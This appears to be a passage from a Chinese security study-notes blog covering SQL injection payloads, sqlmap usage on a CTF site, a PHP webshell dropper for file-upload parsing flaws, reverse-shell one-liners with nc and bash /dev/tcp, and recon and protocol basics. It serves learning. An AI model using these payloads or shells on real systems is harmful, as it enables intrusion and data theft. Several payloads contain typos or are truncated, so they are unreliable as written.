+<h3 id="nping"><a href="#nping" class="headerlink" title="nping"></a>nping</h3><p>nping允许用户发送多种协议（TCP、UDP、ICMP和ARP协议）的数据包。您可以调整协议头中的字段，例如可以设置TCP和UDP的源端口和目的端口。nping和其他类似工具的区别，如nping程序和ping程序之间的区别相似，nping可以探测多个主机的多个端口。</p>
+<p>此外，他可以像ping程序一样发送ICMP echo请求。nping还可以用于对网络进行压力测试，ARP中毒、Dos攻击等。</p>
+<h3 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h3><p>如果是在内网渗透测试中审计Windows 系统，你需要首先获取主机的NetBIOS信息。最常用的工具就是nbtscan.</p>
+<p>这个工具可以将相应的主机IP地址、NetBIOS计算机名、可用服务、登录用户名和MAC地址整理为报告。如需要采用NetBIOS协议访问目标主机NetBIOS服务（例如网络共享），就需要掌握目标主机的NetBIOS名称。这个工具将会产生大量的网络流量，而且很可能被目标主机记录在日志里。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/Web/">Web</a>, <a href="/categories/Web/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/笔记/">笔记</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-12T08:56:12.000Z"><a href="/2020/01/12/20200112/">2020-01-12</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/01/12/20200112/">2020年1月12日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><h3 id="Extravtvalue报错注入"><a href="#Extravtvalue报错注入" class="headerlink" title="Extravtvalue报错注入"></a>Extravtvalue报错注入</h3><pre class="line-numbers language-sql"><code class="language-sql">
+id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="基于时间的注入"><a href="#基于时间的注入" class="headerlink" title="基于时间的注入"></a>基于时间的注入</h3><h4 id="Sleep函数"><a href="#Sleep函数" class="headerlink" title="Sleep函数"></a><strong>Sleep函数</strong></h4><p>在MYSQL中有一个函数：sleep（duration）,这个函数的意识是在duration参数给定的秒数之后运行语句，如下SQL语句：</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span>  <span class="token operator">*</span> <span class="token keyword">from</span>  users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 3秒之后执行SQL语句*/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>判读注入漏洞存在与否</p>
+<p><strong>注入流程</strong></p>
+<p>思路：</p>
+<p>（1）查询当前用户，并获取字符串长度</p>
+<p>（2）截取字符串第一个字符，并且转换为asicc码</p>
+<p>（3）将第一个字符的ASCII与ASCII码表对比，如果对比成功将延迟3秒。</p>
+<p>（4）继续步骤2、3，直至字符串截取完毕。</p>
+<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>（1）布尔盲注：布尔很明显有True和Flase,也就是说它会根据攻击者的注入信息返回True或者False,也就没有了之前的报错信息。</p>
+<p>（2）时间盲注：界面返回值只有一种True，无论输入任何值，返回情况都会按照正常来处理。加入特定的时间函数，通过查看WEB页面的返回时间差来判断注入的语句是否正确。</p>
+<p>（3）报错盲注：根据返回的显示错误信息构造SQL语句来进行的注入，称为报错盲注。</p>
+<p><strong>盲注中用到的函数</strong></p>
+<pre><code>Length（）                  函数 返回字符串的长度
+Substr（）                  截取字符串
+Ascii（）                   返回字符的ascii码
+sleep(n)                   将程序挂起一段时间 n为n秒
+if(expr1,expr2,expr3)      判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句
+</code></pre><h4 id="布尔SQL盲注"><a href="#布尔SQL盲注" class="headerlink" title="布尔SQL盲注"></a>布尔SQL盲注</h4><p><strong>相关函数：</strong></p>
+<p><strong>（1）left(a,b)</strong></p>
+<p>left(database(),1) &gt;’s’     </p>
+<p>函数说明：</p>
+<p>database()显示数据库名称，left(a,b)从左侧截取a的前b位</p>
+<p><strong>（2）Substr()</strong></p>
+<p>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ </p>
+<p>函数说明：</p>
+<p>substr(a,b,c)从b位置开始，截取字符串a的c长度。<br>Ascii()将某个字符转换为ascii值</p>
+<p><strong>（3）ord()、mid(）</strong>        </p>
+<p>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23  </p>
+<p>函数说明：</p>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位</p>
+<p>Ord()函数同ascii()，将字符转为ascii值</p>
+<p><strong>（4）regexp())正则注入</strong></p>
+<p>用法介绍：</p>
+<p>select user() regexp ‘^[a-z]’;</p>
+<p>函数说明：</p>
+<p>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。<br>匹配第二位：</p>
+<p>select user() regexp ‘^ro’</p>
+<p>当正确的时候显示结果为1，不正确的时候显示结果为0.</p>
+<p><strong>（5）Like匹配注入</strong></p>
+<p>和正则注入类似，mysql在匹配的时候可以使用like进行匹配</p>
+<p>select user() like ‘ro%’</p>
+<h4 id="时间SQL盲注"><a href="#时间SQL盲注" class="headerlink" title="时间SQL盲注"></a>时间SQL盲注</h4><p>相关函数：</p>
+<p><strong>（1）if语句+sleep()函数</strong></p>
+<pre><code>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 
+</code></pre><p><u>说明：if判断语句，条件为假时，执行sleep</u></p>
+<p><strong>（2）benchmark（）函数</strong></p>
+<pre><code>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5
+</code></pre><h4 id="报错的SQL盲注"><a href="#报错的SQL盲注" class="headerlink" title="报错的SQL盲注"></a>报错的SQL盲注</h4><p><strong><em>构造payload让信息通过错误提示回显出来</em></strong></p>
+<p>相关函数：</p>
+<p><em>floor()、extravtvalue()、updatexml()</em></p>
+<h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><p>REG007: 查看手机或邮箱注册了哪些网站</p>
+<h2 id="SQL注入截取字符串常用函数"><a href="#SQL注入截取字符串常用函数" class="headerlink" title="SQL注入截取字符串常用函数"></a>SQL注入截取字符串常用函数</h2><p>（1）mid()函数<br>（2）substr()函数<br>（3）Left()函数</p>
+<h2 id="SQLmap使用"><a href="#SQLmap使用" class="headerlink" title="SQLmap使用"></a>SQLmap使用</h2><p><strong>(1）在终端输入命令：</strong></p>
+<p>“Sqlmap.py –u 目标URL” ，-u扫描注入点扫描目标主机，检测出的信息准确</p>
+<p><strong>(2）爆出数据库：</strong></p>
+<p>Sqlmap.py –u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1–-dbs" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1–-dbs</a></p>
+<p><strong>(3）爆表：</strong></p>
+<p>Sqlmap.py –u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1–D" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1–D</a> web1 –-tables</p>
+<p><strong>(4)  爆字段：</strong></p>
+<p>Sqlmap.py –u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1–D" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1–D</a> web1 –T flag –-columns</p>
+<p><strong>(5)  显示字段值：</strong></p>
+<p>Sqlmap.py –u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –D web1 –T flag –C flag –dump</p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><p>当文件为“.asp;1.jpg”时，分号后面的不被解析</p>
+<h3 id="IIS-7-0-7-5-Nginx-lt-8-3畸形解析漏洞"><a href="#IIS-7-0-7-5-Nginx-lt-8-3畸形解析漏洞" class="headerlink" title="IIS 7.0/7.5/Nginx&lt;8.3畸形解析漏洞"></a>IIS 7.0/7.5/Nginx&lt;8.3畸形解析漏洞</h3><p>在默认Fast-CGI开启的状况下，黑客上传一个名字为wooyun.jpg，内容为</p>
+<p>&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd]?)’);?&gt;</p>
+<p>的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>
+<h3 id="Nginx-lt-8-03空字节代码执行漏洞"><a href="#Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="Nginx&lt;8.03空字节代码执行漏洞"></a>Nginx&lt;8.03空字节代码执行漏洞</h3><p><strong>影响版本：0.5，0.6,0.7&lt;=0.7.65,0.8&lt;=0.8.37</strong></p>
+<p>Nginx在图片中嵌入PHP代码然后通过访问 xxx.php%00.jpg 来执行其中的代码</p>
+<p><strong>Apache解析漏洞</strong></p>
+<p>在Apache1.x与Apache2.x中存在解析漏洞，不管文件的后缀是什么，只要是.php.*结尾，就会被Apache服务器解析成PHP文件,问题是Apache如果在mime.types文件里面没有定义的扩展名比如x1.x2.x3的情况下，最后一个x3的没有定义，那么就会将其解析成倒数第二个的x2的定义的扩展名类型。所以xxx.php.rar或者xxx.php.111这些默认没有在mime.types文件定义的都会解析成PHP的.</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/Web/">Web</a>, <a href="/categories/Web/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/笔记/">笔记</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-11T08:56:12.000Z"><a href="/2020/01/11/20200111/">2020-01-11</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/01/11/20200111/">2020年1月11日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="2020-01-11"><a href="#2020-01-11" class="headerlink" title="2020/01/11"></a>2020/01/11</h1><h2 id="nc反弹cmdshell"><a href="#nc反弹cmdshell" class="headerlink" title="nc反弹cmdshell"></a>nc反弹cmdshell</h2><p>window命令主命令为:ncat</p>
+<p>linux主命令为:nc</p>
+<p>以window为例</p>
+<p> 本地监听：ncat -lvvp 8080 </p>
+<p> 往公网反弹cmdshell： </p>
+<p>  ncat -e cmd.exe [ip] 8080 </p>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p>主要命令: bash -i &gt;&amp; /dev/tcp/192.168.174.128/9090 0&gt;&amp;1 </p>
+<p>nc监听端口</p>
+<p>ncat -lvvp 9090</p>
+<p>然后bash反弹，其中ip地址为公网ip</p>
+<p>bash -i &gt;&amp; /dev/tcp/[ip]/9090 0&gt;&amp;1</p>
+<h2 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h2><p>nc监听端口</p>
+<p>ncat -lvvp 9090</p>
+<p>Linux机反弹:</p>
+<p>nc -e /bin/bash [ip] 9090 </p>
+<h2 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h2><p> <strong>渗透测试按测试方法与视角可以分为以下三类：</strong> </p>
+<p>1） 黑盒测试</p>
+<p>定义：渗透测试人员除了知道被测试的目标之外，其余与目标相关的信息一无所知。</p>
+<p>特点：这种类型的渗透测试属于外部渗透测试。在前期需要对目标进行大量的信息收集，耗时较长。但是这种类型的渗透测试更有利于挖掘出系统潜在的漏洞、以及脆弱环节、薄弱点等。</p>
+<p>（2） 白盒测试</p>
+<p>定义：渗透测试人员可以通过正常渠道向被测试单位取得各种资料，包括网络拓扑结构图、员工资料甚至网站程序的代码片段，也可以和单位其他员工进行面对面沟通。</p>
+<p>特点：这种类型的渗透测试在前期已经对目标系统有了一个初步的了解。这类测试的地点可以分为“从组织内部”与“从组织外部”两种大环境。在这种测试下可以充分发挥“社会工程学的力量”，对企业内部雇员的越权操作进行测试。</p>
+<p>（3） 灰盒测试</p>
+<p>定义：灰盒测试介于白盒测试与黑盒测试之间</p>
+<p>特点：属于较为隐秘的测试。在测试当中，被测试单位只有少数人知晓测试的存在，因此能够较好的检验单位中的信息安全事件监控、响应等是否到位。</p>
+<p>渗透测试按照测试目标，可以分为以下四类：</p>
+<p>（1） 操作系统渗透</p>
+<p>Windows、Linux、Solaris、AIX、SCO等</p>
+<p>（2） 数据库系统渗透</p>
+<p>MySQL 、Oracle、MSSQL、sybase、informix</p>
+<p>（3） 应用系统渗透</p>
+<p>由ASP、JSP、PHP等组成的web应用（包括移动应用产品）</p>
+<p>（4） 网络设备渗透</p>
+<p> 防火墙、入侵检测系统等</p>
+<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><p><strong>(1) 明确渗透测试目标和界限</strong></p>
+<p><strong>(2) 信息收集</strong></p>
+<pre><code> *基础信息获取* 
+</code></pre><p>​     <em>WEB扫描信息获取</em> </p>
+<p><strong>(3) 威胁建模制定方案</strong></p>
+<p><strong>(4) 前期渗透测试</strong></p>
+<p>​      根据制定的渗透测试方案开始渗透测试 </p>
+<p><strong>(5) 后期渗透测试</strong></p>
+<p>​     在前期渗透测试的基础上扩大影响范围、提高权限、建立维持访问、清理痕迹 </p>
+<p><strong>(6) 写报告</strong></p>
+<h2 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h2><p><strong>机密性：</strong>要求保护数据内容不被泄漏，加密是实现机密性要求的常用手段。</p>
+<p><strong>完整性：</strong>要求保护的数据内容是完整的、没有被篡改的。常见的保证一致性的技术手段是数字签名。</p>
+<p><strong>可用性：</strong>要求保护的资源是“随需而得”。</p>
+<h2 id="如何实施安全评估"><a href="#如何实施安全评估" class="headerlink" title="如何实施安全评估"></a>如何实施安全评估</h2><p><em>互联网安全的核心问题是数据安全的问题</em></p>
+<h3 id="资产等级划分"><a href="#资产等级划分" class="headerlink" title="资产等级划分"></a>资产等级划分</h3><p> <strong>了解公司最重要的资产是什么，他们最看重的数据是什么</strong>。 </p>
+<p> <strong>在完成资产等级划分之后，需要划分信任域和信任边界。</strong>最简单的划分方式就是从网络逻辑上来划分。</p>
+<h3 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h3><p><strong>找出所有威胁</strong></p>
+<h3 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h3><p>   <strong><em>风险由以下因素组成：</em></strong></p>
+<p>   Risk=Probability*Damage Potential</p>
+<p>   <strong>影响风险高低的因素除了造成损失的大小之外还有考虑到发生的可能性。</strong></p>
+<h3 id="确认解决方案"><a href="#确认解决方案" class="headerlink" title="确认解决方案"></a>确认解决方案</h3><p> <strong>好的安全方案对用户应该是透明的，尽可能地不要改变用户的使用习惯。</strong> </p>
+<p><strong><em>\</em>最终，一个优秀的安方案应该具备以下功能：**</strong></p>
+<ul>
+<li>能够有效的解决问题</li>
+<li>用户体验好</li>
+<li>高性能</li>
+<li>低耦合</li>
+<li>易于扩展与升级</li>
+<li>满足“三要素”</li>
+</ul>
+<h2 id="WEB协议"><a href="#WEB协议" class="headerlink" title="WEB协议"></a>WEB协议</h2><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP（Internet Protocol）协议的英文名直译就是因特网协议，IP协议是TCP/IP协议簇的核心协议，也是TCP/IP协议的载体，所有的TCP、UDP、、ICMP数据都以IP协议数据报格式传输。</p>
+<p>IP协议提供的是不可靠的、无连接的数据传送服务。</p>
+<p><strong>IP包头：</strong></p>
+<p><img src="/2020/01/11/20200111/20180228163405303.png" alt="img"></p>
+<h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p> TCP/IP(Transmission Control Protocol/InternetProtocol) 即传输控制协议/网间协议，是一个工业标准的协议集，它是为广域网（WAN）设计的。 </p>
+<p>TCP协议的首部格式</p>
+<p> <img src="/2020/01/11/20200111/20180228163517930.png" alt="img"> </p>
+<p>TCP协议的特点</p>
+<p>（1）TCP 是面向连接的传输层协议</p>
+<p>（2）TCP 提供可靠交付的服务</p>
+<p>（3）TCP 提供全双工通信</p>
+<p>（4）面向字节流</p>
+<p>TCP三次握手</p>
+<p> <img src="/2020/01/11/20200111/20180228163659575.png" alt="img"> </p>
+<p>步骤：</p>
+<p>（1）客户机A向服务器B发送链接请求，并且设置SYN=1，seq=x </p>
+<p>（2）服务器B收到来自客户机A的链接请求之后，向客户机发送响应，同时设置SYN=1，seq=y,ACK=1,ack=x+1</p>
+<p>（3）当客户机收到来自服务器的响应之后，会给服务器返回一个响应表示已经收到该响应（ACK=1，seq=x+1，ack=y+1）。</p>
+<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p> ARP (AddressResolution Protocol) 是个地址解析协议。最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。 </p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS（Domain Name System）即域名系统，它主要用于实现IP地址与域名地址之间的相互转换。我们经常会在浏览器URL（统一资源定位）地址栏中输入的是一段英文字母组成的域名，而不是一段IP地址，因为IP地址的多变，又是纯数字所以容易记混，所以常常使用域名来进行查询，而DNS的主要左右就是将此时的域名转换为IP地址进行查询.</p>
+<h3 id="NetBIOS协议"><a href="#NetBIOS协议" class="headerlink" title="NetBIOS协议"></a>NetBIOS协议</h3><p> NetBIOS(网络基本输入/输出系统）最初由 IBM，Sytek 作为API开发，使用户软件能使用局域网的资源。自从诞生，Netbois成为许多其他网络应用程序的基础。严格意义上，Netbios 是接入网络服务的接口标准。  </p>
+<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:WorldWide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
+<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
+<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
+<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
+<p> <strong>HTTP请求响应模型：</strong> </p>
+<p> <img src="/2020/01/11/20200111/20180228170340114.png" alt="img"> </p>
+<p> <strong>HTTP消息请求格式</strong> </p>
+<p> <img src="/2020/01/11/20200111/20180228170748406.png" alt="img"> </p>
+<p> <img src="/2020/01/11/20200111/20180228171012341.png" alt="img"> </p>
+<p> <img src="/2020/01/11/20200111/20180228171142973.png" alt="img"> </p>
+<p>HTTP的响应状态码：</p>
+<p>1XX：信息提示，表示请求已被成功接收，继续处理。其范围是100~101</p>
+<p>2XX：成功，服务器成功地处理了请求，其范围是200~206</p>
+<p>3XX：重定向，重定向状态码用于告诉浏览器客户端，它们访问的资源已经被移动，并告诉客户新的资源地址位置。</p>
+<p>4XX:客户端错误状态码，有时客户端会发送一些服务器无法处理的东西，比如格式错误的请求，或者最常见的是，请求一个不存在的URL。其范围是400~415</p>
+<p>5XX：有是有客户端发送一条有效请求，但WEB服务器自身却出错了，可能是WEB服务请运行出错了，或者网站都挂了。范围：500~505</p>
+<p>常见的状态码描述：</p>
+<p>200:客户端请求成功，是最常见的状态。</p>
+<p>302：重定向。</p>
+<p>404：请求资源不存在，是最常见的状态。</p>
+<p>400：客户端请求有语法错误，不能被服务器所理解。</p>
+<p>403：服务器收到请求，但是拒绝提供服务。</p>
+<p>500：服务器内部错误，是最常见的状态之一。</p>
+<p>503：服务器当前不能处理客户端请求，一段时间后可能恢复正常。</p>
+<p>几个重要的HTTP头部构成部分</p>
+<p>（1）Host——请求报头部内容，主要用于指定被请求资源的Internet主机和端口号，例如：Host:<a href="http://www.baidu.com:80" target="_blank" rel="noopener">www.baidu.com:80</a></p>
+<p>（2）User-Agent——请求报头域允许客户端将他的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息。</p>
+<p>（3）Referer——代表当前访问的URL的上一个URL，也就是说，用户是从什么地方来到本页面的，来自哪里。</p>
+<p>（4）Cookie——Cookie是一段文本，常用来表示请求者身份等。</p>
+<p>（5）X-Forward-For———代表请求端的IP，可以有多个，中间使用“，”隔开。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>部分语法百度试用</p>
+<ul>
+<li>Site       指定域名 </li>
+<li>Intext     正文中存在关键字的网页</li>
+<li>Intitle     标题中存在关键字的网页</li>
+<li>Info       一些基本信息</li>
+<li>Inurl      URL存在关键字的网页</li>
+<li>Filetype   搜索指定文件类型    </li>
+</ul>
+<p><strong>双引号: 代表完全匹配搜索</strong></p>
+<p><strong>减号:  代表搜索不包含减号后面的词的页面</strong></p>
+<p><strong>星号: 代表通配符</strong></p>
+<h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><p> <strong>ZoomEye</strong>是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 </p>
+<p><strong>指定搜索的组件</strong>：</p>
+<p>app：组件名称</p>
+<p>var：组件版本</p>
+<p>例如：搜索 apache组件    版本2.4</p>
+<p>app:apache var:2.4</p>
+<p><strong>指定搜素的端口</strong></p>
+<p>port:端口号</p>
+<p>例如：搜索开放了SSH端口的主机</p>
+<p>port:22<br>一些服务器可能监听了非标准的端口。要按照更精确的协议进行检索，可以使用service进行过滤。</p>
+<p><strong>指定搜索的操作系统：</strong></p>
+<p>OS:操作系统</p>
+<p>例如：搜索Linux操作系统</p>
+<p>OS:Linux</p>
+<p><strong>指定搜索的服务：</strong></p>
+<p>service：服务名称</p>
+<p>例如，搜索SSH服务</p>
+<p>service：SSH</p>
+<p><strong>指定搜索的地理位置范围：</strong></p>
+<p>country：国家名</p>
+<p>city:城市名</p>
+<p>例如：</p>
+<p>country:China</p>
+<p>city：Beijing</p>
+<p><strong>指定搜索的CIDR网段：</strong></p>
+<p>cidr:网段</p>
+<p>例如：</p>
+<p>CIDR：192.168.158.12/24</p>
+<p><strong>指定网站域名进行搜索：</strong></p>
+<p>Site:网站域名</p>
+<p>例如：</p>
+<p>site:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p><strong>指定主机名：</strong></p>
+<p>Hostname:主机名</p>
+<p>例如：</p>
+<p>hostname:zwl.cuit.edu.cn</p>
+<p><strong>指定设备名：</strong></p>
+<p>device:设备名</p>
+<p>例如：</p>
+<p>device:router</p>
+<p><strong>指定首页关键词：</strong></p>
+<p>keyword:关键词</p>
+<p>例如：</p>
+<p>keyword:technology</p>
+<h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p> Shodan是一个搜素互联网链接设备的搜索引擎，不同于Google、Baidu这些搜素引擎。用户可以在Shodan上使用Shodan搜索语法查找链接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中是个非常非常不错的神器。 </p>
+<pre class="line-numbers language-java"><code class="language-java">hostname——————————搜索指定的主机或域名，例如 hostname<span class="token operator">:</span>baidu
+port——————————————搜索指定的端口或服务，例如 port<span class="token operator">:</span><span class="token number">80</span>
+country———————————搜索指定的国家，例如 country<span class="token operator">:</span>US
+city——————————————搜索指定的城市，例如 city<span class="token operator">:</span>Chengdu
+org———————————————搜索指定的组织或公司，例如 org<span class="token operator">:</span><span class="token string">"Google"</span>
+isp———————————————搜索指定的ISP供应商，例如 isp<span class="token operator">:</span><span class="token string">"China Telecom"</span>
+product———————————搜索指定的操作系统<span class="token operator">/</span>软件<span class="token operator">/</span>平台，例如 product<span class="token operator">:</span><span class="token string">"Apache httpd"</span>
+version———————————搜索指定的软件版本，例如 version<span class="token operator">:</span><span class="token string">"1.6.2"</span>
+geo———————————————搜索指定的地理位置，参数为经纬度，例如 geo<span class="token operator">:</span><span class="token string">"31.8639, 117.2808"</span>
+before<span class="token operator">/</span>after——————搜索指定收录时间前后的数据，格式为dd<span class="token operator">-</span>mm<span class="token operator">-</span>yy，例如 before<span class="token operator">:</span><span class="token string">"11-11-15"</span>
+net———————————————搜索指定的IP地址或子网，例如 net<span class="token operator">:</span><span class="token string">"210.45.240.0/24"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例子:  Server: uc-httpd 1.0.0 200 OK Country:”CN” </p>
+<h3 id="站长之家"><a href="#站长之家" class="headerlink" title="站长之家"></a>站长之家</h3><h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a><strong>爆字段</strong></h3><p>   order by 猜测的字段数 </p>
+<h3 id="匹配字段"><a href="#匹配字段" class="headerlink" title="匹配字段"></a><strong>匹配字段</strong></h3><p> and 1=1 union select 1,2,3,……,n </p>
+<h3 id="获取显示字段"><a href="#获取显示字段" class="headerlink" title="获取显示字段"></a><strong>获取显示字段</strong></h3><p> and 1=2 union select 1,2,3,4……n </p>
+<h3 id="利用内置函数爆数据库信息"><a href="#利用内置函数爆数据库信息" class="headerlink" title="利用内置函数爆数据库信息"></a><strong>利用内置函数爆数据库信息</strong></h3><p> version() database() user() </p>
+<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a><strong>操作系统信息</strong></h3><p> and  1=2 union  all select  @@global.version_compile_os from  mysql.user </p>
+<h3 id="暴库（mysql-gt-5-0）"><a href="#暴库（mysql-gt-5-0）" class="headerlink" title="暴库（mysql&gt;5.0）"></a><strong>暴库（mysql&gt;5.0）</strong></h3><p> and 1=2 union selec 1,2,3,SCHEMA_NAME,5,6,7,8,9,10  from  information_schema.SCHEMA limit 0,1 </p>
+<h3 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a><strong>猜表</strong></h3><p>and  1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录），1（显示1条记录）</p>
+<h3 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a><strong>爆字段</strong></h3><p> and 1=2 union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schemation.COLUMNS where TABLE_NAMEE=表名（十六进制） limit 0 ,1 </p>
+<h3 id="爆密码"><a href="#爆密码" class="headerlink" title="爆密码"></a><strong>爆密码</strong></h3><p> and 1=2 union select 1,2,3,用户名段，5,6,7,8,9 from 表名 limit 0,1 </p>
